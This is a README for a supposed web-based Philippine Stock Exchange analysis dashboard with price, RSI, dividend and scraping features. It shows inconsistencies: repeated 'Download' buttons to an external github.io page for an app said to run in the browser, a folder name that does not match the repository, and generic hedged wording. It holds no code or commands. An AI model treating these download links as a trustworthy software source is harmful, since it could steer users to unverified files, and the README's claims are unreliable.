# PSE Pro Dashboard v2026 - Stock Analysis Dashboard 2026

> **PSE Pro Dashboard is a web-based Philippine stock exchange analysis dashboard for tracking market movement, reviewing fundamentals, and surfacing stock insights in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/ben-edwards86/pse-pro-dashboard-2026?style=flat-square)](https://github.com/ben-edwards86/pse-pro-dashboard-2026)

---

<p align="center">
  <a href="https://ben-edwards86.github.io/pse-pro-dashboard-2026/">
    <img src="https://img.shields.io/badge/Download-PSE%20Pro%20Dashboard%20Latest-brightgreen?style=for-the-badge" alt="Download PSE Pro Dashboard">
  </a>
</p>

> **[Direct Download - PSE Pro Dashboard v2026](https://ben-edwards86.github.io/pse-pro-dashboard-2026/)**

---

[Download Latest Build](https://ben-edwards86.github.io/pse-pro-dashboard-2026/)

---

## Overview

PSE Pro Dashboard consolidates Philippine stock exchange information into one browser-based workspace. It is built for users who want to follow market direction, inspect fundamentals, and read stock-level signals without juggling several separate tools. The dashboard focuses on market monitoring, technical review, and fundamental validation so the path from raw data to actionable context is shorter and more organized.

It is well suited for anyone scanning a large PSE universe, including more than 280 listed stocks, while still needing supporting details such as dividend figures, trend history, and analyst-style scoring. With chart-driven views and automated scraping, it supports a consistent routine for everyday market checks.

---

## Features

- Live price and trend analysis for active market tracking
- RSI plus support and resistance markers for technical review
- Fundamental scraping from PSE Edge for company data collection
- Market overview spanning 280+ Philippine stocks
- Top picks scoring and recommendation views for quick screening
- Dividend analysis with yield and payout ratio metrics
- Interactive charts with 1-year historical price context
- Automated daily scraping workflow for ongoing updates

---

## Installation

Clone or download the repository, then open the project in a browser-compatible web environment.

1. Get the source:
   - `git clone https://github.com/ben-edwards86/pse-pro-dashboard-2026.git
2. Enter the project folder:
   - `cd pse-stock-analyzer-dashboard`
3. Launch the app using your preferred web server or local preview method.

If you are using a static host, deploy the HTML files and assets to your server, then open the published URL in a browser.

---

## Usage

Treat the dashboard as a working area for reviewing Philippine equities.

Typical workflow:

1. Open the dashboard.
2. Review the overall market overview.
3. Check price movement, trend direction, and RSI signals.
4. Compare support and resistance levels on the chart.
5. Inspect fundamental data pulled from PSE Edge.
6. Review top picks, dividend figures, and portfolio context.
7. Repeat the daily scraping cycle if your deployment includes automation.

For local testing, launch the project through a web server and refresh the page after updating scraped data or chart inputs.

---

## Configuration

If the project includes settings for scraping or refresh timing, keep them in the app configuration or environment variables used by your deployment.

Example structure:

{
  "scrape_schedule": "daily",
  "market_scope": "PSE",
  "history_window": "1y",
  "overview_limit": 280
}

Common configuration areas include:
- scraping source and cadence
- chart history range
- portfolio analysis inputs
- recommendation scoring parameters

---

## Requirements

- Web browser with HTML support
- A local or hosted web server for running the dashboard
- Network access for fetching market and fundamental data
- Storage for scraped results, cached data, or chart history
- Optional scheduled task support for daily automated scraping

---

## FAQ

**How do I get updates?**  
Check the repository regularly and pull the latest changes from the main branch or your deployed source.

**Where are settings stored?**  
Configuration is usually placed in the project files, deployment environment, or scraping workflow setup depending on how you run the dashboard.

**What should I do if data is not appearing?**  
Verify that the scraping process can reach the intended data source and confirm that your browser can load the dashboard assets correctly.

**Can I use it for portfolio review?**  
Yes, the product includes portfolio analysis-oriented features that can help organize watchlists and holdings alongside market data.

**Does it work with the Philippine market only?**  
The available profile and data features are centered on the Philippine Stock Exchange.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
